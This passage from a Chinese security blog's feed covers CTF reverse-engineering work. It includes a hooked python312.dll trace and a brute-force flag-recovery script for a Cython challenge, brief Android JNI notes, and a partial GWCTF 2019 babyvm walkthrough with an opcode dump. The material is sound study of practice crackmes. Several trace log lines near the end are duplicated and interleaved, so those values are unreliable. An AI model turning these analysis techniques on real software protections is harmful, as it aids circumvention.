function_">installHooks</span>();<br>&#125;, <span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><p>运行后在 ida 中附加进程开始动调，input 的内容稍微可以长一点</p><h5 id="trace-结果"><a href="#trace-结果" class="headerlink" title="trace 结果"></a>trace 结果</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] Attached to 35164<br>[*] Python Crypto Trace Script Started<br>[*] Script loaded. Monitoring Python operations...<br>[*] Press Ctrl+C to stop and analyze.<br><br>[*] Installing Python operation hooks...<br>[*] Found Python module: python312.dll at 0x7ff8ab110000<br>[*] Starting trace...<br><br>[*] Successfully hooked 12/12 <span class="hljs-built_in">functions</span><br><br><br>[0001] BITWISE    | PyNumber_Xor<br>       INPUT:  0x100001FFEAB611810000000000000001000000011111111<br>       PARAM:  0x100001FFEAB6118100000000000000020000220E808A7A00000000000000100001FFEAB61181000000000000000100000009E3779B9<br>       OUTPUT: 0x80001FFEAB6118100000000000000010000220E7B902A00000000000000100001FFEAB61181000000000000000100000008F2668A8<br><br>[0002] BITWISE    | PyNumber_And<br>       INPUT:  0x100001FFEAB6118100000088E81846B00000000459042280000000000000080001FFEAB6118100000088E8184670000000111111110<br>       PARAM:  0x100001FFEAB611810000000000000001000000098D24B3A0000000000000100001FFEAB6118100000000000000020000000FA3AFFFF<br>       OUTPUT: 0x100001FFEAB6118100000088E81846B0000000010101110<br><br>[0003] ARITHMETIC | PyNumber_Add<br>       INPUT:  0x100001FFEAB6118100000088E81846B0000000010101110<br>       PARAM:  0x80001FFEAB6118100000000FFFFFFFF000000000000001<br>       OUTPUT: 0x100001FFEAB611810000000000000001000000010101111<br><br>[0004] POWER      | PyNumber_Power<br>       INPUT:  0x100001FFEAB6118100000000000000010000220C011E4CD<br>       PARAM:  0x80001FFEAB611810000000000000002000000040010001<br>       OUTPUT: 0x0000000016C5E4CD<br><br>[0005] OTHER      | PyNumber_Remainder<br>       INPUT:  0x0000000016C5E4CD<br>       PARAM:  0x80001FFEAB6118100000000000000010000001111111100000000000000100001FFEAB6118100000088E81846700000000FFFFFFFD<br>       OUTPUT: 0x80001FFEAB6118100000000000000010000220E7B902A00000000000000100001FFEAB6118100000000000000010000000F9704BDF<br><br>[0006] COMPARE    | PyObject_RichCompare<br>       INPUT:  0x100001FFEAB611810000000000000001000000010101111<br>       PARAM:  0x80001FFEAB611810000000000000002000000052287F38<br>       OUTPUT: 0x0000000000000000<br><br>[0007] BITWISE    | PyNumber_Xor<br>       INPUT:  0x100001FFEAB611810000000000000001000000022222222<br>       PARAM:  0x100001FFEAB6118100000000000000020000220E808A7A00000000000000100001FFEAB61181000000000000000100000009E3779B9<br>       OUTPUT: 0x10768767A969790B0000000000000000000000000000000000000687675A50000000000000100001FFEAB6118100000088E81846B00000000BC155B9B<br><br>[0008] BITWISE    | PyNumber_And<br>       INPUT:  0x10768767A969790B000000000000000000000000000000000000222222220<br>       PARAM:  0x100001FFEAB611810000000000000001000000098D24B3A0000000000000100001FFEAB6118100000000000000020000000FA3AFFFF<br>       OUTPUT: 0x0000000022222220<br><br>[0009] ARITHMETIC | PyNumber_Add<br>       INPUT:  0x0000000022222220<br>       PARAM:  0x80001FFEAB6118100000000FFFFFFFF000000000000002<br>       OUTPUT: 0x100001FFEAB611810000000000000001000000022222222<br><br>[0010] POWER      | PyNumber_Power<br>       INPUT:  0x100001FFEAB6118100000088E81846700000001001782AB<br>       PARAM:  0x80001FFEAB611810000000000000002000000040010001<br>       OUTPUT: 0x00000000151B82AB<br><br>[0011] OTHER      | PyNumber_Remainder<br>       INPUT:  0x00000000151B82AB<br>       PARAM:  0x100001FFEAB6118100000088E81846700000001001782AB0000000000000080001FFEAB6118100000000000000010000000FFFFFFFD<br>       OUTPUT: 0x100001FFEAB6118100000088E81846D00000000113A5AEB<br><br>[0012] COMPARE    | PyObject_RichCompare<br>       INPUT:  0x100001FFEAB611810000000000000001000000022222222<br>       PARAM:  0x100001FFEAB6118100000000000000010000220E807DCB00000000000000100001FFEAB61181000000000000000100000004A30F74D<br>       OUTPUT: 0x0000000000000000<br><br>[0013] BITWISE    | PyNumber_Xor<br>       INPUT:  0x100001FFEAB611810000000000000001000000033333333<br>       PARAM:  0x100001FFEAB6118100000000000000020000220E808A7A00000000000000100001FFEAB61181000000000000000100000009E3779B9<br>       OUTPUT: 0x80001FFEAB6118100000000000000010000220E8080B300000000000000100001FFEAB6118100000000000000010000000AD044A8A<br><br>[0014] BITWISE    | PyNumber_And<br>       INPUT:  0x0000000333333330<br>       PARAM:  0x100001FFEAB611810000000000000001000000098D24B3A0000000000000100001FFEAB6118100000000000000020000000FA3AFFFF<br>       OUTPUT: 0x10768767A969790B000000000000000000000000000000000000032323330<br><br>[0015] ARITHMETIC | PyNumber_Add<br>       INPUT:  0x10768767A969790B000000000000000000000000000000000000032323330<br>       PARAM:  0x80001FFEAB6118100000000FFFFFFFF000000000000003<br>       OUTPUT: 0x100001FFEAB611810000000000000001000000032323333<br><br>[0016] POWER      | PyNumber_Power<br>       INPUT:  0x80001FFEAB61181000000000000000100000010015A089<br>       PARAM:  0x80001FFEAB611810000000000000002000000040010001<br>       OUTPUT: 0x0000000015BDA089<br><br>[0017] OTHER      | PyNumber_Remainder<br>       INPUT:  0x0000000015BDA089<br>       PARAM:  0x80001FFEAB61181000000000000000100000010015A0890000000000000080001FFEAB6118100000000000000010000000FFFFFFFD<br>       OUTPUT: 0x80001FFEAB6118100000000000000010000220E8080B300000000000000100001FFEAB6118100000000000000010000000592EC804<br><br>[0018] COMPARE    | PyObject_RichCompare<br>       INPUT:  0x100001FFEAB611810000000000000001000000032323333<br>       PARAM:  0x100001FFEAB6118100000000000000010000000423A1268<br>       OUTPUT: 0x0000000000000000<br><br>[0019] BITWISE    | PyNumber_Xor<br>       INPUT:  0x100001FFEAB6118100000000000000010000220E80684E00000000000000100001FFEAB611810000000000000001000000044444444<br>       PARAM:  0x100001FFEAB6118100000000000000020000220E808A7A00000000000000100001FFEAB61181000000000000000100000009E3779B9<br>       OUTPUT: 0x10768767A969790B0000000000000000000000000000000000000323233300000000000000080001FFEAB6118100000088E81846B00000000DA733DFD<br><br>[0020] BITWISE    | PyNumber_And<br>       INPUT:  0x100001FFEAB6118100000088E81846D00000000000000010768767A969790B000000000000000000000000000000000000444444440<br>       PARAM:  0x100001FFEAB611810000000000000001000000098D24B3A0000000000000100001FFEAB6118100000000000000020000000FA3AFFFF<br>       OUTPUT: 0x0000000040004440<br><br>[0021] ARITHMETIC | PyNumber_Add<br>       INPUT:  0x0000000040004440<br>       PARAM:  0x80001FFEAB6118100000000FFFFFFFF000000000000004<br>       OUTPUT: 0x3569453C2D9A35111CBA10000000000000180001FFEAB6118100000088E816B5700000B24C1F4C8F8C13326F00000000000000040004444<br><br>[0022] POWER      | PyNumber_Power<br><br>[0023] OTHER      | PyNumber_Remainder<br>       INPUT:  0x0000000036634E67<br>18100000088E81846700000000FFFFFFFD<br>       OUTPUT: 0x10768767A969790B0000000000000000000000000000000000004444444400000000000000100001FFEAB6118100018100000088E81846700000000FFFFFFFD<br>       OUTPUT: 0x10768767A969790B0000000000000000000000000000000000004444444400000000000000100001FFEAB6118100000088E81846D000000007ACF1933<br><br><br>[0024] COMPARE    | PyObject_RichCompare<br>[0024] COMPARE    | PyObject_RichCompare<br>       INPUT:  0x87BBEC3CD29C7BC326BE100000000000001800       INPUT:  0x87BBEC3CD29C7BC326BE10000000000000180001FFEAB6118100000088E816B5A00000B24C1F4C8F8C13326F0000001FFEAB6118100000088E816B5A00000B24C1F4C8F8C13326F00000000000000040004444<br>       PARAM:  0x80001FFEAB6118100000000000000020000000400100010000000000000080001FFEAB611810000000000000001000000088108807<br>       OUTPUT: 0x0000000000000000<br></code></pre></td></tr></table></figure><p>从 trace 中可以发现一些关键数据，并且观察出输入长度应该是 32，分成了四组，这里的 trace 结果并没有看到左移和右移的操作，可以动调分析去找找<br><img src="/../images/pyd/p10.png"><br><img src="/../images/pyd/p11.png"><br><img src="/../images/pyd/p12.png"><br><img src="/../images/pyd/p13.png"></p><h5 id="爆破脚本"><a href="#爆破脚本" class="headerlink" title="爆破脚本"></a>爆破脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product<br><br><span class="hljs-comment"># 掩码参数和加密常量</span><br>MASK = <span class="hljs-number">0xFA3AFFFF</span><br>BIT_INDICES = [<span class="hljs-number">26</span>, <span class="hljs-number">24</span>, <span class="hljs-number">23</span>, <span class="hljs-number">22</span>, <span class="hljs-number">18</span>, <span class="hljs-number">16</span>]<br><span class="hljs-comment"># 0xFA3AFFFF = 11111010001110101111111111111111</span><br>CONST_XOR = <span class="hljs-number">0x9e3779b9</span><br>MOD = <span class="hljs-number">0xfffffffd</span><br>EXP = <span class="hljs-number">0x10001</span><br><br><span class="hljs-comment"># 已知加密后的结果</span><br>CIPHERS1 = [<span class="hljs-number">0x12287F38</span>, <span class="hljs-number">0x4a30f74d</span>, <span class="hljs-number">0x23a1268</span>, <span class="hljs-number">0x88108807</span>]<br>CIPHERS2 = [<span class="hljs-number">0x98d24b3a</span>, <span class="hljs-number">0xe0f1db77</span>, <span class="hljs-number">0xadf38403</span>, <span class="hljs-number">0xd8499bb6</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_bits</span>(<span class="hljs-params">val, bits</span>):<br>   <span class="hljs-comment"># 恢复被掩掉的 6 个比特位</span><br>    <span class="hljs-keyword">for</span> idx, sel <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(BIT_INDICES, bits):<br>        val = val | (<span class="hljs-number">1</span> &lt;&lt; idx) <span class="hljs-keyword">if</span> sel <span class="hljs-keyword">else</span> val &amp; ~(<span class="hljs-number">1</span> &lt;&lt; idx)<br>    <span class="hljs-keyword">return</span> val<br><br>    <span class="hljs-comment"># if sel == 1:</span><br>    <span class="hljs-comment">#     val = val | (1 &lt;&lt; idx)  # 把第 idx 位设为 1</span><br>    <span class="hljs-comment"># else:</span><br>    <span class="hljs-comment">#     val = val &amp; ~(1 &lt;&lt; idx)  # 把第 idx 位清为 0</span><br>    <span class="hljs-comment"># return val</span><br><br><br><span class="hljs-comment"># x = (part &gt;&gt; 28)          # 取最高4位</span><br><span class="hljs-comment"># y = (part &lt;&lt; 4) &amp; MASK    # 低28位左移4位并掩码</span><br><span class="hljs-comment"># y += x                    # 把最高4位加入</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_block</span>(<span class="hljs-params">cipher1, cipher2</span>):<br>    <br>    x = cipher1 &amp; <span class="hljs-number">0xF</span> <span class="hljs-comment"># 取最低4位</span><br>    y = cipher1 - x<br><br>    <span class="hljs-keyword">for</span> bits <span class="hljs-keyword">in</span> product([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>], repeat=<span class="hljs-built_in">len</span>(BIT_INDICES)):<br>        y_restored = set_bits(y, bits)<br>        part = ((x &lt;&lt; <span class="hljs-number">28</span>) | (y_restored &gt;&gt; <span class="hljs-number">4</span>)) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>        p1 = (part ^ CONST_XOR) &gt;&gt; <span class="hljs-number">11</span><br>        res = <span class="hljs-built_in">pow</span>(p1, EXP, MOD)<br><br>        <span class="hljs-keyword">if</span> res == cipher2:<br>            <span class="hljs-keyword">return</span> part<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    recovered = [decrypt_block(c1, c2) <span class="hljs-keyword">for</span> c1, c2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(CIPHERS1, CIPHERS2)]<br>    flag_hex = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;p:08x&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> recovered)<br>    <span class="hljs-built_in">print</span>(flag_hex)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br><span class="hljs-comment"># output:813a97f3d4b34f74802ba12678950880</span><br></code></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Cython</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安卓基础知识笔记</title>
    <link href="/2025/07/02/android_note/"/>
    <url>/2025/07/02/android_note/</url>
    
    <content type="html"><![CDATA[<h3 id="安卓四大组件"><a href="#安卓四大组件" class="headerlink" title="安卓四大组件"></a>安卓四大组件</h3><p>Activity(活动)、Service(服务)、BroadcastReceiver(广播接收者)、ContentProvider(内容提供者)</p><h3 id="JNI-静态注册和动态注册"><a href="#JNI-静态注册和动态注册" class="headerlink" title="JNI 静态注册和动态注册"></a>JNI 静态注册和动态注册</h3><p>Java 支持调用 C&#x2F;C++ 代码，JNI(Java Native Interface)的作用是粘合 Java 代码和 C&#x2F;C++ 代码  </p><p><strong>静态注册</strong> 遵循一定的命名规则，一般是 <code>Java_packagename_classname_methodname(JNIEnv *env,jclass/jobject,...)</code></p><p><strong>动态注册</strong> 有几个关键点</p><p>使用结构体 JNINativeMethod 来记录java方法和jni函数的对应关系 </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* name; <span class="hljs-comment">//Java方法名</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* signature; <span class="hljs-comment">//方法的参数和返回值，使用字符串记录，格式形如`()V, (I)I`，括号内表示函数参数，括号右侧表示函数返回值</span><br>    <span class="hljs-type">void</span>*       fnPtr; <span class="hljs-comment">// 指向JNI函数的函数指针</span><br>&#125; JNINativeMethod;<br></code></pre></td></tr></table></figure><p>java 端的 native 方法<br>c&#x2F;c++ 代码实现的JNI_Onload()方法</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>向 VM 的步步靠近--部分 vm 赛题复现</title>
    <link href="/2025/05/24/vm/"/>
    <url>/2025/05/24/vm/</url>
    
    <content type="html"><![CDATA[<h2 id="GWCTF-2019-babyvm"><a href="#GWCTF-2019-babyvm" class="headerlink" title="[GWCTF 2019]babyvm"></a>[GWCTF 2019]babyvm</h2><h3 id="修结构体"><a href="#修结构体" class="headerlink" title="修结构体"></a>修结构体</h3><p>ida 中查看 main 函数，点进 sub_CD1 里<br><img src="/../images/vm/sub1.png"><br><strong>前4个字段</strong>：写入4个32位整数（DWORD），偏移分别为0, 4, 8, 12,这是在设置寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint32_t</span> eax;    <span class="hljs-comment">// 偏移 0</span><br><span class="hljs-type">uint32_t</span> ebx;    <span class="hljs-comment">// 偏移 4 (初始值为18)</span><br><span class="hljs-type">uint32_t</span> ecx;    <span class="hljs-comment">// 偏移 8</span><br><span class="hljs-type">uint32_t</span> edx;    <span class="hljs-comment">// 偏移 12</span><br></code></pre></td></tr></table></figure><p><strong>后续字段</strong>：从偏移16开始，每16字节写入一个函数指针（QWORD）和一个操作码（BYTE），共8次</p><p>分析第一个条目：函数指针写入偏移16（占8字节），操作码写入偏移24（占1字节），从偏移16到24的总跨度：8字节（函数指针） + 8字节（操作码及填充） &#x3D; 16字节</p><p>注：操作码仅占1字节，但为了对齐，编译器填充了7字节</p><p>后面的条目也是一样</p><p><strong>处理程序条目结构体</strong><br>函数指针（64位）：占用8字节（QWORD）<br>操作码（8位）：占用1字节（BYTE）。<br>填充（7字节）：为保证对齐到16字节边界，需填充7字节<br>由此可以定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HandlerEntry</span> &#123;</span><br>    <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span> *); <span class="hljs-comment">// 8字节函数指针</span><br>    <span class="hljs-type">int8_t</span> opcode;           <span class="hljs-comment">// 1字节操作码</span><br>    <span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">7</span>];      <span class="hljs-comment">// 7字节填充</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>一共有八个处理条目,所以可以定义结构体 <strong>VMcpu</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VMcpu</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> eax;         <span class="hljs-comment">// 偏移 0</span><br>    <span class="hljs-type">uint32_t</span> ebx;         <span class="hljs-comment">// 偏移 4 </span><br>    <span class="hljs-type">uint32_t</span> ecx;         <span class="hljs-comment">// 偏移 8</span><br>    <span class="hljs-type">uint32_t</span> edx;         <span class="hljs-comment">// 偏移 12</span><br>    HandlerEntry handlers[<span class="hljs-number">8</span>];<span class="hljs-comment">// 偏移16，共8个条目</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>在 ida 的 Local Types 里面右键 Add type，定义这两个结构体 <strong>HandlerEntry</strong> 和 <strong>VMcpu</strong> ，<code>Y</code>键修改sub_CD1 的参数 a1 的类型，改成 <strong>VMcpu</strong>*,可以看到修改完之后会好看很多</p><h3 id="提取操作码"><a href="#提取操作码" class="headerlink" title="提取操作码"></a>提取操作码</h3><p><img src="/../images/vm/gw3.png"><br>&amp;unk_202060 处存的是操作码，需要提取出来<br><img src="/../images/vm/gw4.png"></p><h3 id="分析函数对应的功能"><a href="#分析函数对应的功能" class="headerlink" title="分析函数对应的功能"></a>分析函数对应的功能</h3><p>接下看每个操作码对应的函数，把每个函数传入的参数 a1 的类型也修成 VMcpu*，然后分析其功能<br><strong>sub_B5F</strong> -&gt; <strong>mov</strong> 寄存器赋值操作,对于不同的操作码进行不同的 mov<br><img src="/../images/vm/gw5.png"><br><strong>sub_A64</strong> -&gt; <strong>xor</strong> 明显的异或<br><img src="/../images/vm/gw6.png"><br><strong>sub_AC5</strong> -&gt; <strong>cmp strlen</strong> 可以看出这是在判断字符串长度<br><img src="/../images/vm/gw7.png"><br><strong>sub_956</strong> -&gt; <strong>nop</strong> 啥也没做，那就是 nop 了<br><img src="/../images/vm/gw8.png"><br><strong>sub_A08</strong> -&gt; <strong>mul</strong> 乘法操作<br><img src="/../images/vm/gw9.png"><br><strong>sub_8F0</strong> -&gt; <strong>swap</strong> 交换寄存器的值<br><img src="/../images/vm/gw10.png"><br><strong>sub_99C</strong> 这个里面是一个稍微复杂点的运算<br><img src="/../images/vm/gw11.png"></p><h3 id="写脚本获得汇编"><a href="#写脚本获得汇编" class="headerlink" title="写脚本获得汇编"></a>写脚本获得汇编</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=[<br><br>  <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <br>  <span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x02</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x23</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <br>  <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <br>  <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span 